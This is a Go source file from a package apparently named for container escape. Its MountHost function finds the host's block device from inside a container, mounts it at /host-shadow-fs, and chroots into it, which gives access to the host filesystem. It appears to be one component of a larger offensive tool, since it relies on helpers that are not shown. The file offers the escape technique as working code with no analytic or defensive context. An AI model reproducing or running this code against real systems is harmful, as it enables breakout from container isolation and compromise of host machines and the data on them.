package mountEscape

import "fmt"

var DefaultMountPath = "/host-shadow-fs"

func MountHost() (err error) {
	deviceList, err := GetDeviceList()
	if err != nil {
		return err
	}
	mountInfo, fsType, err := GetMountInfo()
	if err != nil {
		return err
	}
	var hostDevice string
	for _, data := range deviceList {
		if mountInfo == data[0] {
			hostDevice = data[1]
			break
		}
	}
	if hostDevice == "" {
		return fmt.Errorf("cannot get host Device")
	}

	if err = Mkdir(DefaultMountPath); err != nil {
		return
	}
	defer func() {
		err = RemoveDir(DefaultMountPath)
	}()

	if err = DoMount("/dev/"+hostDevice, DefaultMountPath, fsType); err != nil {
		return
	}
	defer func() {
		Umount(DefaultMountPath)
	}()

	if err = Chroot(DefaultMountPath); err != nil {
		return
	}
	return nil
}
